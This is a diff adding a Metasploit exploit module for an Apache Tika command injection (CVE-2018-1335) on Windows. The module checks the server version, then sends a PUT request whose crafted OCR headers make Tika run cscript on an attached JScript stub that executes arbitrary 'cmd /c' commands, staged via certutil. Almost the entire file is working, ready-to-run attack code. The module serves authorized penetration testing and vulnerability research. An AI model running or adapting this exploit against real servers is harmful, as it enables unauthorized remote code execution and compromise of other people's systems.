@@ -1,0 +1,123 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Apache Tika Header Command Injection',
+      'Description'    => %q{
+          This module exploits a command injection vulnerability in Apache
+        Tika 1.15 - 1.17 on Windows.  A file with the image/jp2 content-type is
+        used to bypass magic bytes checking.  When OCR is specified in the
+        request, parameters can be passed to change the parameters passed
+        at command line to allow for arbitrary JScript to execute. A
+        JScript stub is passed to execute arbitrary code. This module was
+        verified against version 1.15 - 1.17 on Windows 2012.
+        While the CVE and finding show more versions vulnerable, during
+        testing it was determined only > 1.14 was exploitable due to
+        jp2 support being added.
+      },
+      'License'        => MSF_LICENSE,
+      'Privileged'     => false,
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          ['Windows',
+            {'Arch' => [ARCH_X86, ARCH_X64],
+            'Platform' => 'win',
+            'CmdStagerFlavor' => ['certutil']
+            }
+          ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Apr 25 2018',
+      'Author' =>
+        [
+          'h00die', # msf module
+          'David Yesland', # edb submission
+          'Tim Allison' # discovery
+        ],
+      'References' =>
+        [
+          ['EDB', '46540'],
+          ['URL', 'https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/'],
+          ['URL', 'https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E'],
+          ['CVE', '2018-1335']
+        ]))
+
+    register_options(
+      [
+        Opt::RPORT(9998),
+        OptString.new('TARGETURI', [true, 'The base path to the web application', '/'])
+      ])
+
+    register_advanced_options(
+      [
+        OptBool.new('ForceExploit', [true, 'Override check result', false])
+      ])
+  end
+
+  def check
+    res = send_request_cgi({
+             'uri'    => normalize_uri(target_uri),
+           })
+    if res.nil?
+      vprint_error('No server response, check configuration')
+      return CheckCode::Safe
+    elsif res.code != 200
+      vprint_error('No server response, check configuration')
+      return CheckCode::Safe
+    end
+
+    if res.body =~ /Apache Tika (\d.[\d]+)/
+      version = Gem::Version.new($1)
+      vprint_status("Apache Tika Version Detected: #{version}")
+      if version.between?(Gem::Version.new('1.15'), Gem::Version.new('1.17'))
+        return CheckCode::Vulnerable
+      end
+    end
+    CheckCode::Safe
+  end
+
+  def execute_command(cmd, opts = {})
+    cmd.gsub(/"/, '\"')
+    jscript="var oShell = WScript.CreateObject('WScript.Shell');\n"
+    jscript << "var oExec = oShell.Exec(\"cmd /c #{cmd}\");"
+
+    print_status("Sending PUT request to #{peer}#{normalize_uri(target_uri, 'meta')}")
+    res = send_request_cgi({
+             'method' => 'PUT',
+             'uri'    => normalize_uri(target_uri, 'meta'),
+             'headers' => {
+                "X-Tika-OCRTesseractPath" => '"cscript"',
+                "X-Tika-OCRLanguage"      => "//E:Jscript",
+                "Expect"                  => "100-continue",
+                "Content-type"            => "image/jp2",
+                "Connection"              => "close"},
+             'data' => jscript
+           })
+
+    fail_with(Failure::Disconnected, 'No server response') unless res
+    unless (res.code == 200 && res.body.include?('tika'))
+      fail_with(Failure::UnexpectedReply, 'Invalid response received, target may not be vulnerable')
+    end
+  end
+
+  def exploit
+    checkcode = check
+    unless checkcode == CheckCode::Vulnerable || datastore['ForceExploit']
+      print_error("#{checkcode[1]}. Set ForceExploit to override.")
+      return
+    end
+
+    execute_cmdstager(linemax: 8000)
+  end
+end
